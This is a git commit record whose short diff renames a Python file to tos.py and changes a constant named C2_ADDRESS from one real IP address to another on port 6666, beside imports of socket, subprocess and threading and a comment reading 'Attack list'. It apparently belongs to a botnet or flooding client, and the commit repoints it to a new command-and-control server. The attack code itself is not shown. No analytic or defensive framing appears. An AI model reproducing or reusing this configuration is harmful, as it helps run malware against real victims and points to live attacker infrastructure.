a4c8f7ba4752ba0ef96dcdf80203d62115abcde6
anaslmzbeb <rayanjames853@gmail.com>
2025-05-09 20:50:22 +0100

    Update and rename brahim.py to tos.py

--- tos.py
+++ tos.py
@@ -2,7 +2,7 @@ import subprocess, random, random, os, time, threading, socket, sys
 from binascii import unhexlify
 
 # Configuration
-C2_ADDRESS  = "185.194.177.247"
+C2_ADDRESS  = "134.255.216.46"
 C2_PORT     = 6666
 
 # Attack list
